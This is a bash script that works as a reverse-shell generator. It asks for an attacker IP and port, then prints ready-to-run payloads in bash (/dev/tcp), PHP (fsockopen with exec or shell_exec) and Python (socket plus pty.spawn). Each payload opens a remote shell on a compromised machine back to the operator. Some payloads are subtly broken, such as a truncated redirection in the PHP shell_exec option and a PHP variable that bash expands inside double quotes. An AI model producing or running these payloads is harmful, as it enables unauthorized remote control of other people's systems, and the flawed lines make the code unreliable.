#!/bin/bash

#Author: WhosStranger

#Colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Numbers to select:
first="${yellowColour}[1]${endColour}"
second="${yellowColour}[2]${endColour}"
third="${yellowColour}[3]${endColour}"
four="${yellowColour}[4]${endColour}"
five="${yellowColour}[5]${endColour}"

#Expressions
alert="${yellowColour}[!]${endColour}"
question="${yellowColour}[?]${endColour}"
success="${yellowColour}[*]${endColour}"
error="${yellowColour}[x]${endColour}"

#Success message
message="\n${success} ${turquoiseColour}Reverse Shell created.${endColour}"

trap ctrl_c INT

function ctrl_c(){
	echo -ne "\n\n${yellowColour}[*]${endColour} ${purpleColour}Leaving...${endColour}"
	exit 0
}

#Just printing the author
echo -e "\n${success} ${blueColour}By WhosStranger${endColour}"

function print_menu() {
  echo -e "\n${first} ${blueColour}Bash -i${endColour}"
  echo -e "\n${second} ${blueColour}Bash 5${endColour}"
  echo -e "\n${third} ${blueColour}PHP Exec${endColour}"
  echo -e "\n${four} ${blueColour}PHP Shell Exec ${endColour}"
  echo -e "\n${five} ${blueColour}Python${endColour}"
  echo -ne "\n${question} ${blueColour}Choose an option: ${endColour}" && read Option
}

function reverse() {
  sleep 1; clear
  print_menu

  case $Option in
    1)
      clear
      echo -ne "\n${question} ${blueColour}Type the IP address: ${endColour}" && read IP
      echo -ne "\n${question} ${blueColour}Type the listen Port: ${endColour}" && read Port
      echo -e "\n${alert} ${purpleColour}sh -i >& /dev/tcp/$IP/$Port 0>&1${endColour}" 
      echo -e $message
      ;;
    2)
      clear
      echo -ne "\n${question} ${blueColour}Type the IP address: ${endColour}" && read IP
      echo -ne "\n${question} ${blueColour}Type the listen Port: ${endColour}" && read Port
      echo -e "\n${alert} ${purpleColour}sh -i 5<> /dev/tcp/$IP/$Port 0<&5 1>&5 2>&5${endColour}"
      echo -e $message
      ;;
    3)
      clear
      echo -ne "\n${question} ${blueColour}Type the IP address: ${endColour}" && read IP
      echo -ne "\n${question} ${blueColour}Type the listen Port: ${endColour}" && read Port 
      echo -e "\n${alert} ${purpleColour}php -r '$sock=fsockopen(\"$IP\",$Port);exec(\"sh <&3 >&3 2>&3\");'${endColour}"
      ;;
    4)
      clear
      echo -ne "\n${question} ${blueColour}Type the IP address: ${endColour}" && read IP
      echo -ne "\n${question} ${blueColour}Type the listen Port: ${endColour}" && read Port
      echo -e "\n${alert} ${purpleColour}php -r '$sock=fsockopen(\"$IP\",$Port);shell_exec(\"sh <&3 >&3 2>&\");'${endColour}" 
      echo -e $message
      ;;
    5)
      clear
      echo -ne "\n${question} ${blueColour}Type the IP address: ${endColour}" && read IP
      echo -ne "\n${question} ${blueColour}Type the listen Port: ${endColour}" && read Port
      echo -e "\n${alert} ${purpleColour}export RHOST=\"$IP\";export RPORT=$Port;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'${endColour}" 
      echo -e $message
      ;;
    *)
      echo -e "\n${error} ${redColour}Select a correct option.${endColour}"
      ;;
  esac
}

[ "$(id -u)" == "1000" ] && reverse
